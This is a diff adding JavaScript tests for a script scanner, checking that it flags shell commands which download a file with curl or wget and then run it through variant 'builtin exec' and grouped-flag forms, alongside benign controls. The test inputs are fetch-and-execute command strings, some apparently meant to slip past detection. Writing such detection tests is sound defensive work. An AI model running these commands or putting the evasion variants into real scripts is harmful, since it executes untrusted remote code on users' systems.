@@ -67,3 +67,44 @@ for(const [name,cmd] of [
    name+' / '+JSON.stringify(got));
  });
 }
+
+const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
+const BASH_EXEC_POSITIVE=[
+ 'curl -fsSL '+URL+' -o payload; builtin exec payload',
+ 'wget -q '+URL+' -O payload; builtin exec -c payload',
+ 'curl -fsSL '+URL+' -o payload; command builtin exec -l payload',
+ 'curl -fsSL '+URL+' -o payload; builtin builtin exec -- payload',
+ 'curl -fsSL '+URL+' -o payload; exec -cl payload',
+ 'curl -fsSL '+URL+' -o payload; exec -lc payload',
+ 'curl -fsSL '+URL+' -o payload; builtin exec -a replacement payload'
+];
+test('Codex red-team: all Bash builtin exec wrappers and grouped -cl/-lc execute downloaded bytes',()=>{
+ for(const [i,script] of BASH_EXEC_POSITIVE.entries()){
+  const got=findingsForScript(script);
+  assert.ok(got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
+    'case '+i+' unsafe code execution was missed: '+JSON.stringify(got));
+  const yaml=audit(script);
+  assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),
+    'workflow case '+i+': '+JSON.stringify(yaml));
+ }
+});
+test('Codex benign controls: harmless grouped exec flags must not fail closed',()=>{
+ for(const cmd of [
+  'curl -fsSL '+URL+' -o payload; exec -cl /bin/true',
+  'curl -fsSL '+URL+' -o payload; builtin exec -lc /bin/true',
+  'curl -fsSL '+URL+' -o payload; command builtin exec -- /bin/true',
+  'curl -fsSL '+URL+' -o payload; builtin exec -a harmless /bin/true'
+ ]){
+  const findings=findingsForScript(cmd);
+  assert.ok(!findings.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),cmd+': '+findings);
+  assert.ok(!findings.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),cmd+': '+findings);
+ }
+});
+test('Codex unknown exec options fail closed but do not falsely claim confirmed execution',()=>{
+ for(const cmd of ['exec -z payload','builtin exec -z payload','exec -cz payload']){
+  const script='curl -fsSL '+URL+' -o payload; '+cmd;
+  const got=findingsForScript(script);
+  assert.ok(got.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),cmd+': '+got);
+  assert.ok(!got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),cmd+': '+got);
+ }
+});
